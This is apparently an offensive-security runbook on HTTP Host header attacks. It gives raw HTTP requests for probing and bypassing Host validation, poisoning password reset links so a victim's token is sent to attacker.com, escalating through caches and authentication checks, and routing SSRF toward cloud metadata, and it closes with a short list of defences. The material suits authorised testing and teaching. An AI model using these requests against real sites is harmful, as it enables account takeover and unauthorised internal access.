# Runbook: HTTP Host header attacks

The Host header decides which site a request is meant for, and applications quietly trust it
in more places than they realise: password reset links, absolute URLs, routing decisions,
and cache keys. Where that trust is misplaced, the header becomes an injection point. This
runbook works from probing the header through to the escalations it opens.

## Prerequisites

- Burp Repeater for editing the Host header and adding override headers.
- An account whose password reset email is readable, for the reset-poisoning path.
- An OOB channel (Burp Collaborator) for the routing-based SSRF path.

## Phase 1: Probe the header

Send a normal request with the Host header changed to an arbitrary value and watch the
response:

```
GET / HTTP/1.1
Host: attacker.com
```

A page that renders normally suggests the server is the default virtual host and trusts the
header. An error or redirect suggests validation worth probing for bypasses.

## Phase 2: Bypass validation

Where an arbitrary Host is rejected, try the usual gaps:

- Put the payload in the port, which is often unchecked: `Host: target.com:attacker.com`.
- Supply a value that contains the allowed host: `Host: target.com.attacker.com`.
- Send duplicate Host headers, or an absolute URL in the request line plus a Host header, and
  see which one the back-end honours.
- Inject an override header that the application prefers over Host:

```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
```

## Phase 3: Password reset poisoning

Where the reset link is built from the Host header, request a reset for a victim account with
the header pointed at an attacker host:

```
POST /forgot-password HTTP/1.1
Host: attacker.com

email=victim@target.com
```

If the email the victim receives contains a link to `attacker.com` carrying their reset
token, the token is captured when they click, or when a link prefetcher fetches it. A
dangling-markup variant works where only part of the URL is attacker-controlled.

## Phase 4: Authentication and cache escalation

- Some applications grant extra trust to requests that appear to come from an internal host.
  Test whether a chosen Host or override header reaches an admin panel or bypasses an
  authentication check.
- Where the Host reaches a script URL or other cached content, hand off to the
  [web cache poisoning](cache-poisoning.md) runbook: a poisoned Host stored in the cache
  serves the payload to every user.

## Phase 5: Routing-based SSRF

Where a front-end routes by Host, the header can redirect the back-end connection to an
internal target:

```
GET / HTTP/1.1
Host: 169.254.169.254
```

Watch the Collaborator for the back-end's onward request, then pivot to internal services and
cloud metadata. Flawed request parsing and connection-state attacks (reusing a connection
whose first request set an accepted Host) extend the same idea past a strict front-end.

## Output

- Whether the Host header is trusted, and which bypass reached the sink.
- For reset poisoning, the captured token and the account takeover it enabled.
- For routing-based SSRF, the internal targets reached, with OOB confirmation.

## Techniques

- [HTTP Host header attacks](../techniques/headers.md)
- [SSRF](../techniques/ssrf.md)
- [Web cache poisoning](cache-poisoning.md)

## Counter moves

Runbook: HTTP Host header attacks is the case here. Validating Host against an allowlist,
building absolute URLs from configuration rather than the header, and refusing override
headers are the counters. The defender's view can be found in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
